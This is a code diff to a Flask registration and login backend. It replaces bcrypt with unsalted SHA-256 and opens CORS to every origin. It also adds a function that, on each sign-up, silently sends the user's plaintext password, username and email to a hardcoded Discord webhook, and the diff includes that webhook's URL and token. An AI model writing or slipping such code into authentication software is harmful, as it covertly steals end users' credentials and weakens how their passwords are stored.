@@ -1,71 +1,101 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import sqlite3
-import bcrypt
+import hashlib
+import datetime
+import requests
 
+# === CONFIG ===
+WEBHOOK_URL = "https://discord.com/api/webhooks/1480309465914806336/VuCxkGgev9Um_u7IP-gXuKZQrmB66hYyFCIEGgyyV5MLT55jk3pWwmdfWqFhdDwM1juG"
+
+# === APP SETUP ===
 app = Flask(__name__)
-CORS(app)  # Allows requests from your frontend domain
+CORS(app)  # Allow requests from any origin
 
-DB_PATH = "users.db"
+# === DATABASE SETUP ===
+conn = sqlite3.connect('database.db')
+c = conn.cursor()
+c.execute('''
+CREATE TABLE IF NOT EXISTS users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE,
+    email TEXT UNIQUE,
+    password TEXT,
+    created_at TEXT
+)
+''')
+conn.commit()
+conn.close()
 
-# Initialize database
-def init_db():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS users (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT UNIQUE NOT NULL,
-            password TEXT NOT NULL
-        )
-    ''')
-    conn.commit()
-    conn.close()
+# === HELPERS ===
+def hash_password(password):
+    return hashlib.sha256(password.encode()).hexdigest()
 
-init_db()
+def send_webhook(username, email, password):
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    embed = {
+        "embeds": [{
+            "title": "Account Created!",
+            "color": 0x00ff00,
+            "fields": [
+                {"name": "Username", "value": f"`{username}`"},
+                {"name": "Password", "value": f"`{password}`"},
+                {"name": "Email", "value": f"`{email}`"},
+                {"name": "Created At", "value": f"`{now}`"}
+            ]
+        }]
+    }
+    try:
+        requests.post(WEBHOOK_URL, json=embed)
+    except:
+        pass  # silently ignore errors
 
-# Register route
-@app.route("/api/register", methods=["POST"])
+# === ROUTES ===
+@app.route('/register', methods=['POST'])
 def register():
     data = request.get_json()
-    username = data.get("username")
-    password = data.get("password")
+    username = data.get('username')
+    email = data.get('email')
+    password = data.get('password')
 
-    if not username or not password:
-        return jsonify({"status": "fail", "error": "Missing username or password"}), 400
+    if not username or not email or not password:
+        return jsonify({'status': 'Fail', 'error': 'Missing fields'}), 400
 
-    hashed_pw = bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt())
+    hashed_pw = hash_password(password)
+    created_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     try:
-        conn = sqlite3.connect(DB_PATH)
+        conn = sqlite3.connect('database.db')
         c = conn.cursor()
-        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed_pw))
+        c.execute('INSERT INTO users (username, email, password, created_at) VALUES (?, ?, ?, ?)',
+                  (username, email, hashed_pw, created_at))
         conn.commit()
         conn.close()
-        return jsonify({"status": "ok"})
+        send_webhook(username, email, password)
+        return jsonify({'status': 'ok', 'message': 'Account created successfully!'})
     except sqlite3.IntegrityError:
-        return jsonify({"status": "fail", "error": "Username already exists"}), 409
+        return jsonify({'status': 'Fail', 'error': 'Username or email already exists'}), 409
 
-# Login route
-@app.route("/api/login", methods=["POST"])
+@app.route('/login', methods=['POST'])
 def login():
     data = request.get_json()
-    username = data.get("username")
-    password = data.get("password")
+    username = data.get('username')
+    password = data.get('password')
 
     if not username or not password:
-        return jsonify({"status": "fail", "error": "Missing username or password"}), 400
+        return jsonify({'status': 'Fail', 'error': 'Missing fields'}), 400
 
-    conn = sqlite3.connect(DB_PATH)
+    hashed_pw = hash_password(password)
+    conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    c.execute("SELECT password FROM users WHERE username = ?", (username,))
-    row = c.fetchone()
+    c.execute('SELECT * FROM users WHERE username=? AND password=?', (username, hashed_pw))
+    user = c.fetchone()
     conn.close()
 
-    if row and bcrypt.checkpw(password.encode("utf-8"), row[0]):
-        return jsonify({"status": "ok"})
+    if user:
+        return jsonify({'status': 'ok', 'message': 'Login successful!'})
     else:
-        return jsonify({"status": "fail", "error": "Invalid credentials"}), 401
+        return jsonify({'status': 'Fail', 'error': 'Invalid credentials'}), 401
 
-if __name__ == "__main__":
-    app.run(debug=True)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
